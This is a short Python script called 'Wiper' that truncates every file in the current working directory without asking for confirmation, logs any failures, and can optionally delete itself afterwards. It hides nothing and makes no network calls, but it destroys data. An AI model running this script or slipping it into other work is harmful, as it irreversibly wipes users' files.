"""
Wiper : Wipe your current directory's files in one go!
Author: @GaganGulyani
"""

from os import listdir, getcwd, remove
from os.path import isfile, join, realpath
from pickle import load, dump
from typing import Final

# CONFIG (CONSTANT VALUES)
CURRENT_DIR: Final = getcwd()
SELF_DESTRUCT: Final = False
CURRENT_SCRIPT: Final = realpath(__file__)
DISPLAY_MESSAGE: Final = True


def wipe_files(CURRENT_DIR, display_message=True):
    """
        This function Removes the data of files in current directory
        It will remove the current script if SELF_DESTRUCT is True.

        In case of failure, error message(s) are handled by error_handler()

        Args:
            CURRENT_DIR:
                Current Working Directory

            display_message (optional):

                If True (defualt):
                    displays the progress of cleanup if True

                Else:
                    Script works silently

                Note: Errors will always be logged by error_handler

        Returns:
            None
    """

    errors = []

    # Traverse Files in Current Directory
    for current_dir in listdir(CURRENT_DIR):

        # get path of file
        current_path = join(CURRENT_DIR, current_dir)

        # If current_path is a file
        # remove it's contents
        if isfile(current_path):

            # Ignore current script file
            if current_path == CURRENT_SCRIPT:
                continue

            # Remove the file's contents
            # In case of error, handle them
            try:
                open(current_path, 'w')

            except Exception as e:
                error = {'filename': current_dir,
                         'reason': e}
                errors.append(error)

                if display_message:
                    print('\n\n' + '=' * 35)
                    print(
                        f"\n[ERROR] Something went wrong while wiping \"{current_dir}\"")
                    print('[ERROR] Please check "errors.log" for more info..')
                    print('\n' + '=' * 35 + '\n')
            else:
                if display_message:
                    print(f'[CLEANED] {current_dir}')

    # call the error handler
    error_handler(errors)


def error_handler(errors, error_filename='errors.log'):
    """
        This function logs errors in  "errors.log" in case of any error.

        Args:

            errors:
                List of Dictionaries containing errors in "filename:reason" pair

            error_filename:
                file name for logging errors

        Returns:
            None
    """
    if errors:
        # Create a file named 'errors.log' for logging errors
        with open(error_filename, 'w') as f:

            f.write("Wiper ERROR LOG:\n")
            f.write("Following Errors Occurred During File Cleanup:\n")

            for error in errors:
                f.write(f'\n\n[FILENAME] {error.get("filename")}\n')
                f.write(f'[REASON] => {error.get("reason")}\n\n')


def main():
    """
        This function executes the wiper function

        Args:
            None

        Returns:
            None
    """

    print('='*35)
    print("\n\nWiper by @GaganGulyani\n")
    print('Wiping Files:\n')

    wipe_files(
        CURRENT_DIR,
        display_message=DISPLAY_MESSAGE
    )

    if SELF_DESTRUCT:
        remove(CURRENT_SCRIPT)
        print('Wiper SELF DESTRUCTED!')


if __name__ == '__main__':
    main()
